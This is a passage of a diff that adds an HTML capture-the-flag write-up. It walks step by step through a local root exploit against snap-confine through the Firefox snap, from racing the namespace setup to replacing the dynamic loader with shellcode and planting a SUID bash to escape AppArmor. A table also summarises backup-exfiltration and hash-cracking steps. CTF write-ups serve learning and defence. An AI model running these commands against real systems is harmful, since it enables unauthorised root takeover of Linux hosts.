+                    <div class="step-title">Enter Sandbox — Anchor Namespace <span class="step-tag">TERMINAL 1</span></div>
+                    <p>Enter the Firefox snap sandbox and anchor the mount namespace in <code style="color:var(--green)">/tmp</code>. Keep <code style="color:var(--green)">.snap</code> alive with a touch loop.</p>
+                    <div class="code-block">
+                        <div class="code-header"><span class="lang">bash</span><span>Terminal 1</span></div>
+                        <pre><code>env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine \
+  --base core22 snap.firefox.hook.configure /bin/bash
+cd /tmp && echo $$
+# > 32512 (note this PID)
+
+while test -d /tmp/.snap; do touch /tmp/; sleep 1; done</code></pre>
+                    </div>
+                </div>
+            </div>
+            <div class="step">
+                <div class="step-num-col"><div class="step-circle">02</div><div class="step-line"></div></div>
+                <div class="step-content">
+                    <div class="step-title">Access Sandbox /tmp via /proc Bypass <span class="step-tag">TERMINAL 2</span></div>
+                    <p>After <code style="color:var(--green)">.snap</code> is deleted, access sandbox <code style="color:var(--green)">/tmp</code> through <code style="color:var(--green)">/proc/PID/cwd</code> — bypasses <code style="color:var(--green)">700 root:root</code> on snap-private-tmp.</p>
+                    <div class="code-block">
+                        <div class="code-header"><span class="lang">bash</span><span>Terminal 2</span></div>
+                        <pre><code>cd /proc/32512/cwd
+ls -la  # confirms empty /tmp inside namespace</code></pre>
+                    </div>
+                </div>
+            </div>
+            <div class="step">
+                <div class="step-num-col"><div class="step-circle">03</div><div class="step-line"></div></div>
+                <div class="step-content">
+                    <div class="step-title">Destroy Cached Namespace <span class="step-tag">TERMINAL 2</span></div>
+                    <div class="code-block">
+                        <div class="code-header"><span class="lang">bash</span><span>Terminal 2</span></div>
+                        <pre><code>systemd-run --user --scope --unit=snap.d$(date +%s) /bin/bash
+env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine \
+  --base snapd snap.firefox.hook.configure /nonexistent
+# error expected — tears down cached namespace</code></pre>
+                    </div>
+                </div>
+            </div>
+            <div class="step">
+                <div class="step-num-col"><div class="step-circle">04</div><div class="step-line"></div></div>
+                <div class="step-content">
+                    <div class="step-title">Win the Race via AF_UNIX Backpressure <span class="step-tag">TERMINAL 2</span></div>
+                    <p>Helper throttles snap-confine's stderr through a 1-byte socket buffer. Detects trigger string then atomically swaps libraries via <code style="color:var(--green)">renameat2(RENAME_EXCHANGE)</code>.</p>
+                    <div class="code-block">
+                        <div class="code-header"><span class="lang">bash</span><span>Race Exploit</span></div>
+                        <pre><code>~/firefox_2404 ~/librootshell.so
+
+[*] CVE-2026-3888 — firefox 24.04 helper
+[*] Exchange dir ready: 285 entries
+[*] Starting race against snap-confine...
+[!] TRIGGER DETECTED! Swapping .exchange...
+[+] SWAP DONE! Race won.</code></pre>
+                    </div>
+                </div>
+            </div>
+            <div class="step">
+                <div class="step-num-col"><div class="step-circle">05</div><div class="step-line"></div></div>
+                <div class="step-content">
+                    <div class="step-title">Plant Busybox & Overwrite Dynamic Loader <span class="step-tag">TERMINAL 3</span></div>
+                    <p>Access poisoned namespace via <code style="color:var(--green)">/proc/INNER_PID/root</code>, plant busybox, overwrite <code style="color:var(--green)">ld-linux-x86-64.so.2</code> with shellcode.</p>
+                    <div class="code-block">
+                        <div class="code-header"><span class="lang">bash</span><span>Terminal 3</span></div>
+                        <pre><code>PID=$(cat /proc/32512/cwd/race_pid.txt)
+cd /proc/$PID/root
+stat -c '%U:%G' usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+# jonathan:jonathan  ← we own the loader!
+
+cp /usr/bin/busybox ./tmp/sh
+cat ~/librootshell.so > ./usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</code></pre>
+                    </div>
+                </div>
+            </div>
+            <div class="step">
+                <div class="step-num-col"><div class="step-circle">06</div><div class="step-line"></div></div>
+                <div class="step-content">
+                    <div class="step-title">Trigger Root Shell & Escape Sandbox <span class="step-tag">TERMINAL 3</span></div>
+                    <p>Execute snap-confine — kernel maps shellcode as dynamic linker with SUID privileges. Shellcode calls <code style="color:var(--green)">setreuid(0,0)</code> → <code style="color:var(--green)">execve("/tmp/sh")</code>.</p>
+                    <div class="code-block">
+                        <div class="code-header"><span class="lang">bash</span><span>Root Shell</span></div>
+                        <pre><code>env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine \
+  --base core22 snap.firefox.hook.configure /usr/lib/snapd/snap-confine
+
+BusyBox v1.36.1 built-in shell (ash)
+/ # id
+uid=0(root) gid=1000(jonathan) groups=1000(jonathan)
+
+# Escape AppArmor sandbox
+cp /bin/bash /var/snap/firefox/common/bash
+chmod 04755 /var/snap/firefox/common/bash
+exit</code></pre>
+                    </div>
+                    <div class="code-block">
+                        <div class="code-header"><span class="lang">bash</span><span>Full Root</span></div>
+                        <pre><code>/var/snap/firefox/common/bash -p
+
+bash-5.1# id
+uid=1000(jonathan) gid=1000(jonathan) euid=0(root)
+bash-5.1# cat /root/root.txt</code></pre>
+                    </div>
+                    <div class="flag-box">
+                        <div class="flag-icon">👑</div>
+                        <div>
+                            <div class="flag-label">Root Flag Captured — Machine Pwned</div>
+                            <div class="flag-value">bash-5.1# cat /root/root.txt</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="section" id="summary">
+        <h2 class="section-title"><span class="icon">04</span> Techniques Summary</h2>
+        <table class="tech-table">
+            <thead><tr><th>Technique</th><th>Detail</th></tr></thead>
+            <tbody>
+                <tr><td>Unauthenticated Backup Exfil</td><td>CVE-2026-27944 — /api/backup exposes full config + AES key in response header</td></tr>
+                <tr><td>AES-256-CBC Decryption</td><td>Key and IV decoded from base64 X-Backup-Security header, decrypted with OpenSSL</td></tr>
+                <tr><td>bcrypt Cracking</td><td>Hash extracted from SQLite db, cracked with John + rockyou.txt</td></tr>
+                <tr><td>TOCTOU Race via I/O Backpressure</td><td>AF_UNIX socket with SO_RCVBUF=1 single-steps snap-confine execution byte-by-byte</td></tr>
+                <tr><td>/proc/PID/cwd Namespace Bypass</td><td>Traverses into snap mount namespace bypassing 700 root:root on snap-private-tmp</td></tr>
+                <tr><td>renameat2(RENAME_EXCHANGE)</td><td>Atomic directory swap poisons namespace libraries without TOCTOU window</td></tr>
+                <tr><td>Dynamic Linker Hijacking</td><td>ld-linux-x86-64.so.2 replaced with shellcode — kernel loads it before the SUID binary</td></tr>
+                <tr><td>AppArmor Sandbox Escape</td><td>SUID bash planted in /var/snap/firefox/common/ — allowed by Firefox AppArmor profile</td></tr>
+            </tbody>
+        </table>
+    </div>
+
+</main>
+
+<footer>
+    <a href="../../writeups.html">← All Writeups</a> &nbsp;·&nbsp; © 2026 Oussama Zehri
+</footer>
+
+<script>
+    const observer = new IntersectionObserver((entries) => {
+        entries.forEach(el => {
+            if (el.isIntersecting) {
+                el.target.style.opacity = '1';
+                el.target.style.transform = 'translateY(0)';
+            }
+        });
+    }, { threshold: 0.08 });
+
+    document.querySelectorAll('.step, .info-card, .vuln-box, .flag-box').forEach(el => {
+        el.style.opacity = '0';
+        el.style.transform = 'translateY(16px)';
+        el.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
+        observer.observe(el);
+    });
+</script>
+</body>
+</html>
